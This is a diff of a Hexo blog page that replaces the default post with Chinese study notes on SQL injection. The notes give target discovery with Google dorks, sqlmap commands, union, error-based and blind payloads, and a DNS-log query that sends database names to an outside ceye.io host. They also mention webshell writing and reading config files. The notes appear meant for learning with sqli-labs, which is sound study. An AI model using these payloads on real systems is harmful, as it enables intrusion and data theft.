@@ -14,11 +14,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="热爱可抵岁月漫长">
+  <meta name="description" content="web安全之SQL注入">
   <meta name="author" content="Sean">
   <meta name="keywords" content="">
   
-  <title>Hello World - Sean&#39;s Blog</title>
+  <title>SQL注入 - Sean&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Hello World">
+            <span class="h2" id="subtitle" title="SQL注入">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-08-25 17:29" pubdate>
-        2021年8月25日 下午
+      <time datetime="2021-08-13 17:33" pubdate>
+        2021年8月13日 下午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      75 字
+      612 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      7
        分钟
     </span>
   
@@ -225,27 +225,123 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Hello World</h1>
+            <h1 style="display: none">SQL注入</h1>
             
             <div class="markdown-body">
-              <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+              <p>web安全之SQL注入</p>
+<span id="more"></span>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
+<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>MySQL</li>
+<li>sqli-labs</li>
+</ul>
+<h2 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h2><ul>
+<li>web应用架构</li>
+<li>MySQL架构</li>
+<li>SQL语法</li>
+</ul>
+<h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><h3 id="函数-amp-逻辑运算"><a href="#函数-amp-逻辑运算" class="headerlink" title="函数&amp;逻辑运算"></a>函数&amp;逻辑运算</h3><ul>
+<li><code>substr(string,start,偏移量)</code></li>
+<li><code>ascii()</code></li>
+<li><code>user()</code></li>
+<li><code>version()</code></li>
+<li><code>and</code>;<code>or</code>;只能接判断</li>
+<li><code>union</code></li>
+<li><code>concat</code>;<code>group_concat</code></li>
+</ul>
+<h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata<br><span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;dbName&#x27;</span><br><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;tabName&#x27;</span><br><span class="hljs-keyword">select</span> colName <span class="hljs-keyword">from</span> dbName.tabName<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><ol>
+<li>目标搜集<ul>
+<li>Google语法，如<code>inurl:php?id=</code></li>
+<li>工具爬取，如spider</li>
+</ul>
+</li>
+<li>寻找注入点<ul>
+<li>手工识别<ul>
+<li>单引号判断</li>
+<li><code>and 1=1/and 1=2</code>和<code>and &#39;1&#39;=&#39;1/and &#39;1&#39;=&#39;2</code>判断注入类型</li>
+</ul>
+</li>
+<li>工具识别sqlmap<ul>
+<li><code>sqlmap -u url</code>：扫描单个目标链接；</li>
+<li><code>sqlmap -m filename</code>：将多个目标链接保存在一个文件中，进行多链接扫描；</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>数据获取</li>
+<li>提权<ul>
+<li>执行系统命令</li>
+<li>读文件<ul>
+<li>数据库配置文件for远程连接</li>
+<li>系统配置文件for信息搜集</li>
+</ul>
+</li>
+<li>写文件：webshell</li>
+</ul>
+</li>
+</ol>
+<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><p><strong>使用条件</strong>：1.只能用于<strong>select</strong>查询语句（只有最后一个select子句可以有<code>order by</code>或<code>limit</code>）；2.联合语句的查询结果必须有相同数量的列；3.页面要有回显；</p>
+<ol>
+<li><code>order by</code>确定列数；</li>
+<li>确定哪几列可以显示在页面</li>
+<li>插入sql语句读取数据库相关信息。</li>
+</ol>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><strong>使用条件</strong>：会打印错误信息并返回到页面，与union注入相比还适用于update，insert语句。</p>
+<p>常用函数：</p>
+<ul>
+<li><p><code>floor()</code>向下取整</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat((<span class="hljs-keyword">select</span> version()),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>));<br></code></pre></td></tr></table></figure>
+
+<p>在floor()前插入注入语句。</p>
+</li>
+<li><p><code>extractvalue(XML_document, XPath_string)</code>:从目标XML中返回包含所查询值的字符串,由XPATH格式不对而报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>))<br></code></pre></td></tr></table></figure>
+
+<p>在注入语句之前一定要确保有非法字符才能产生完整报错。</p>
+</li>
+<li><p><code>updatexml(XML_document, XPath_string, new_value)</code>:替换查找到的符合条件的数据,其他同上</p>
+</li>
+</ul>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>页面无回显</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><ul>
+<li><code>left()</code>:left(a,b)表示从左侧截取a的前b位，返回字符串；</li>
+<li><code>regexp</code>:正则表达式</li>
+<li><code>like</code></li>
+<li><code>substr()</code>,<code>ascii()</code>:<code>ascii(substr((select database()),1,1))</code></li>
+<li><code>ord()</code>,<code>mid()</code>,同上</li>
+</ul>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><ul>
+<li><p><code>if(condition,true,false)</code>,<code>sleep(ms)</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(<span class="hljs-keyword">left</span>(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">3</span>))<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="dnslog盲注"><a href="#dnslog盲注" class="headerlink" title="dnslog盲注"></a>dnslog盲注</h3><p>dnslog平台：<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io/</a></p>
+<p>原理：DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-string">&#x27;.****.ceye.io\\filename&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="防御绕过"><a href="#防御绕过" class="headerlink" title="防御绕过"></a>防御绕过</h1><h1 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h1><h1 id="其他数据库"><a href="#其他数据库" class="headerlink" title="其他数据库"></a>其他数据库</h1><ul>
+<li>MsSQL</li>
+<li>Oracle</li>
+</ul>
 
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+                    
+                      <a class="hover-with-bg" href="/categories/web%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BF%9B%E9%98%B6%E7%89%88/">web安全工程师进阶版</a>
+                    
+                  </div>
                 
                 
               </div>
@@ -261,12 +357,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2021/08/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">文件上传漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/08/16/python%E7%88%AC%E8%99%AB/">
-                        <span class="hidden-mobile">python爬虫</span>
+                      <a href="/2021/08/09/Python/">
+                        <span class="hidden-mobile">Python</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
